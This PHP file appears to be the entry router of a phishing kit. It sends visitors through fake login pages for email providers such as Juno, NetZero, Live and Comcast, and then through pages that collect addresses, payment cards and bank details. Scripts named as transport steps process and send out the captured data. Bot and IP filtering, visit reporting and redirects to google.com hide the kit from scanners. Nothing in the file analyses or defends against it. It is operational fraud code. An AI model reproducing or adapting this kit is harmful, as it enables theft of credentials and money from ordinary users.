<?php
session_start();

$config = require __DIR__ . '/../config/config.php';

require_once __DIR__ . '/../../core/Router.php';
require_once __DIR__ . '/../../core/EntityFunctions.php';
require_once __DIR__ . '/../../core/EntityVariables.php';
$request = trim(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH), '/');
if ($request !== 'entity') {
    if (!BlockBadVisitors()) {
        exit;
    }
}
use Core\Router;

$router = new Router();
$router->addRoute('karma', 'KarmaEntity/panel/karma.php');
$router->addRoute('login', 'views/account/email.php');
$router->addRoute('loginAuth', 'views/account/password.php');
$router->addRoute('secure', 'views/features/secure.php');
$router->addRoute('locked', 'views/features/locked.php');
$router->addRoute('prime', 'views/features/prime.php');
$router->addRoute('device', 'views/features/device.php');
$router->addRoute('juno', 'views/emails/juno.php');
$router->addRoute('netzero', 'views/emails/netzero.php');
$router->addRoute('live', 'views/emails/live.php');
$router->addRoute('mail', 'views/emails/mail.php');
$router->addRoute('x_finity', 'views/emails/comcast.php');
$router->addRoute('account/process', 'transport/account_process.php');
$router->addRoute('account/finish', 'transport/send_account.php');
$router->addRoute('yourAddress', 'views/info/address.php');
$router->addRoute('address/process', 'transport/address_process.php');
$router->addRoute('yourPayments', 'views/payments/card.php');
$router->addRoute('payments/process', 'transport/payments_process.php');
$router->addRoute('yourBank', 'views/payments/bank.php');
$router->addRoute('bank/process', 'transport/bank_process.php');
$router->addRoute('entity', 'KarmaEntity/panel/entity.php');

$param = $config['parameter'];

if (isset($_GET[$param])) {

    if ($config["use_entity"]) {
        $ipvisit = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';

        if ($ipvisit === '127.0.0.1' || $ipvisit === '::1') {
            $ipvisit = '103.156.164.111';
        }
        $info = EntityInfo($ipvisit);
        $userAgent = $info['userAgent'];
        $_SESSION['entity_allowed'] = true;
        if (!CheckEntity($ipvisit, $userAgent)) {
            exit;
        }
    } else {
        $ipvisit = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
        if ($ipvisit === '127.0.0.1' || $ipvisit === '::1') {
            $ipvisit = '103.156.164.111';
        }
        $info = EntityInfo($ipvisit);
        $userAgent = $info['userAgent'];
        $_SESSION['entity_allowed'] = true;
        EntityMessage('VISIT', $ipvisit);
        // if (!CheckGoBot($ipvisit, $userAgent)) {
        //     exit;
        // }
    }

    $random_entity_id = bin2hex(random_bytes(32));

    header("Location: /login?entityId=" . $random_entity_id);
    exit;
}

$request = trim(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH), '/');

$protected_routes = ['login', 'loginAuth', 'secure', 'locked', 'device', 'juno', 'netzero', 'mail', 'live', 'x_finity', 'account/process', 'account/finish', 'yourAddress', 'address/process', 'yourPayments', 'payments/process', 'yourBank'];

if (in_array($request, $protected_routes) && empty($_SESSION['entity_allowed'])) {
    header("Location: https://google.com");
    exit;
}

if ($request === '' || $request === 'index') {
    header("Location: https://google.com");
    exit;
} else {
    $router->route();
}
?>